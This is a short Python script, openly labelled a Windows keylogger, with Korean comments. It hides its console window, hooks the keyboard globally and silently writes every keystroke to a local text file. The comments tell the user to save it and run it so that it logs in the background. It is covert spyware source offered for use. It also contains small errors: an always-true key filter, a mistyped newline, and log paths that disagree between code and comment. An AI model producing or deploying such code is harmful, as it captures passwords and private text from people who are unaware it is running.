# Python code for keylogger
# to be used in windows
from os import _exit

import win32api
import win32console
import win32gui
import pythoncom, pyWinhook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)


def OnKeyboardEvent(event):
    if event.Ascii == 5:
        _exit(1)
    if event.Ascii != 0 or 8:
        # open output.txt to read current keystrokes
        f = open('c:\Python\output.txt', 'r+')
        buffer = f.read()
        f.close()
        # open output.txt to write current + new keystrokes
        f = open('c:\Python\output.txt', 'w')
        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
            keylogs = '/n'
        buffer += keylogs
        f.write(buffer)
        f.close()
    # create a hook manager object


hm = pyWinhook.HookManager()
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
# 파일을
# C: \에
# Keylogger.py로
# 저장하고
# Python
# 파일을
# 실행하십시오.
# 출력:
# 키로거가
# 백그라운드에서
# 시작되고
# 모든
# 데이터를
# 로그
# 파일“c: \ output.txt”에
# 저장합니다.